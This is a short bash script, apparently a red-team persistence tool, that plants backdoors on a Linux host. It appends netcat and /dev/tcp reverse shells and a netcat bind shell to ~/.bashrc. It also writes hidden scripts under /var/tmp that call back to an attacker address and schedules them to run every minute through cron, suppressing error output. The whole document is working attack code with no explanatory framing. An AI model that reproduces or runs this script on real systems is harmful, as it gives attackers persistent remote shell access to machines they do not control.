#!/bin/bash

attackBox=192.168.56.12
attackPort=5253
cron="* * * * *"

touch ~/.bashrc &&
echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc && 
echo "[+] Netcat reverse shell placed in $HOME/.bashrc"
sleep 2

echo "echo 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1 | bash' | sh 2> /dev/null & sleep .0001" >> ~/.bashrc
echo "[+] Bash reverse shell placed in $HOME/.bashrc"
sleep 2

echo "echo 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1 | bash' | sh" > /var/tmp/.cron.sh &&
chmod +x /var/tmp/.cron.sh &&
echo "$cron cd /var/tmp && ./.cron.sh" > cronjobtmp.sh &&
crontab cronjobtmp.sh &&
echo "[+] Bash reverse shell (/var/tmp/.cron.sh) set on a cron"
rm cronjobtmp.sh
sleep 2


echo "nc $attackBox $attackPort" > /var/tmp/.cron2.sh &&
chmod +x /var/tmp/.cron2.sh &&
echo "$cron cd /var/tmp && ./.cron2.sh" > cronjobtmp.sh && 
crontab cronjobtmp.sh &&
echo "[+] Netcat reverse shell (/var/tmp/.cron2.sh) set on a cron"
rm cronjobtmp.sh

echo "nc -lnvp $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc && 
echo "[+] Netcat bind shell placed in $HOME/.bashrc"
sleep 2

echo "nc -lnvp  $attackPort -e /bin/bash 2> /dev/null & sleep .0001" > /var/tmp/.cron3.sh &&
chmod +x /var/tmp/.cron3.sh &&
echo "$cron cd /var/tmp && ./.cron3.sh" > cronjobtmp.sh && 
crontab cronjobtmp.sh &&
echo "[+] Netcat bind shell (/var/tmp/.cron3.sh) set on a cron"
rm cronjobtmp.sh
